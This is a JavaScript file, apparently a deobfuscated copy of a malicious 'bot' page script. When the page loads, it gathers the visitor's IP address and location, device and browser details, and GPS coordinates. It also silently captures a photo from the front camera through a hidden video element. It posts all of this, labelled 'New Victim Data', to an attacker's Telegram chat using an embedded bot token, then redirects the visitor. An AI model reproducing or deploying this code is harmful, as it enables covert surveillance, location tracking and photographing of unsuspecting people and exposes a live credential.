// SG Modder Bot Script - Decoded Version
// This script collects user information and sends to Telegram

const config = {
    telegramBotToken: "8332213003:AAG9PbZ8yT_YohDUw5kh_dkDQbTPH0lYlgY",
    apiUrl: "https://api.telegram.org/bot"
};

// Get IP and Location Details
async function getIpDetails() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (!ipResponse.ok) throw new Error('Failed to get IP');
        
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        
        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        if (!locationResponse.ok) throw new Error('Failed to get location');
        
        const locationData = await locationResponse.json();
        
        return {
            ip: ip,
            country: locationData.country_name || 'Unknown',
            region: locationData.region || 'Unknown',
            city: locationData.city || 'Unknown',
            isp: locationData.org || 'Unknown',
            timezone: locationData.timezone || 'Unknown'
        };
    } catch (error) {
        console.error('Error getting IP details:', error);
        return {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown', 
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown'
        };
    }
}

// Get Device Information
async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: navigator.userAgent,
        deviceType: getDeviceType(),
        screenResolution: `${screen.width}x${screen.height}`,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled()
    };

    // Battery Information
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            deviceInfo.charging = battery.charging;
            deviceInfo.chargingPercentage = Math.round(battery.level * 100);
        } catch (e) {
            console.error('Battery API not supported');
        }
    }

    // Network Information
    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }

    return deviceInfo;
}

// Detect Device Type
function getDeviceType() {
    const userAgent = navigator.userAgent.toLowerCase();
    
    if (/mobile/i.test(userAgent)) {
        return 'Mobile';
    } else if (/tablet/i.test(userAgent)) {
        return 'Tablet';
    } else {
        return 'Desktop';
    }
}

// Get Geolocation
async function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject('Geolocation not supported');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            position => {
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                resolve(locationData);
            },
            error => {
                reject(`Location error: ${error.message}`);
            }
        );
    });
}

// Start Camera and Capture Photo
async function startCamera() {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    try {
        const constraints = {
            video: { facingMode: "user" }
        };
        
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.play();
        
        return video;
    } catch (error) {
        console.error('Camera error:', error);
        throw new Error('Cannot access camera');
    }
}

// Capture Photo from Video
async function capturePhoto(videoElement) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/png');
}

// Send Message to Telegram
async function sendTelegramMessage(chatId, message) {
    try {
        const response = await fetch(`${config.apiUrl}${config.telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        console.log('Telegram response:', result);
        return result;
    } catch (error) {
        console.error('Telegram error:', error);
        return null;
    }
}

// Send Photo to Telegram
async function sendPhoto(chatId, photoData) {
    try {
        const response = await fetch(`${config.apiUrl}${config.telegramBotToken}/sendPhoto`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                photo: photoData,
                caption: 'Captured Photo'
            })
        });
        
        const result = await response.json();
        console.log('Photo sent:', result);
        return result;
    } catch (error) {
        console.error('Photo send error:', error);
    }
}

// Main Function - Collect and Send All Information
async function autoSendInfo() {
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('id');
    
    if (!chatId) {
        console.error('No chat ID provided');
        return;
    }

    try {
        // Collect all information
        const ipDetails = await getIpDetails();
        const deviceInfo = await getDeviceInfo();
        let locationData = null;
        let photoData = null;

        // Try to get location
        try {
            locationData = await getLocation();
        } catch (e) {
            console.warn('Location access denied');
        }

        // Try to capture photo
        try {
            const video = await startCamera();
            await new Promise(resolve => video.addEventListener('loadeddata', resolve));
            photoData = await capturePhoto(video);
            
            // Stop camera
            video.srcObject.getTracks().forEach(track => track.stop());
            video.remove();
        } catch (e) {
            console.warn('Camera access denied');
        }

        // Format message
        const message = `
🔍 <b>Ayna Bott - New Victim Data</b>

📱 <b>Device Information:</b>
├ 📱 Mobile: ${deviceInfo.deviceType}
├ 🔋 Charging: ${deviceInfo.charging ? 'Yes' : 'No'}
├ 📶 Network: ${deviceInfo.networkType || 'Unknown'}
├ 🕒 Timezone: ${deviceInfo.timeZone}
├ 🌐 User Agent: ${deviceInfo.userAgent}
└ 📺 Resolution: ${deviceInfo.screenResolution}

🌐 <b>IP Information:</b>  
├ 🌍 IP: ${ipDetails.ip}
├ 🏳️ Country: ${ipDetails.country}
├ 🏙️ Region: ${ipDetails.region}
├ 🏢 City: ${ipDetails.city}
├ 🔌 ISP: ${ipDetails.isp}
└ 🕒 Timezone: ${ipDetails.timezone}

📍 <b>Location:</b>
${locationData ? 
`├ 📍 Latitude: ${locationData.latitude}
├ 📍 Longitude: ${locationData.longitude}
└ 🎯 Accuracy: ${locationData.accuracy}m` : 
'├ ❌ Location access denied'}

👨‍💻 <b>Browser Info:</b>
├ 🌐 Language: ${deviceInfo.language}
├ 💻 Platform: ${deviceInfo.platform}
├ 🍪 Cookies: ${deviceInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}
└ ☕ Java: ${deviceInfo.javaEnabled ? 'Enabled' : 'Disabled'}

⚠️ <i>This data was collected automatically</i>
        `.trim();

        // Send message to Telegram
        const telegramResult = await sendTelegramMessage(chatId, message);
        
        // Send photo if available
        if (photoData) {
            await sendPhoto(chatId, photoData);
        }

        if (telegramResult && telegramResult.ok) {
            window.location.href = `https://t.me/ronjumodz`;
        }

    } catch (error) {
        console.error('Error in autoSendInfo:', error);
    }
}

// Anti-Debugging and Obfuscation Detection (Removed from decoded version)
// These functions were used to prevent debugging and detect analysis tools

// Initialize when page loads
window.addEventListener('DOMContentLoaded', autoSendInfo);

// Additional utility functions
function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const text = 'Ayna Bot 😎';
    
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText(text, 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText(text, 4, 17);
    
    return canvas.toDataURL();
}

function getWebGLFingerprint() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return 'WebGL not supported';
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
    };
}

// Export functions for testing
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        getIpDetails,
        getDeviceInfo,
        getDeviceType,
        getLocation,
        sendTelegramMessage,
        autoSendInfo
    };
}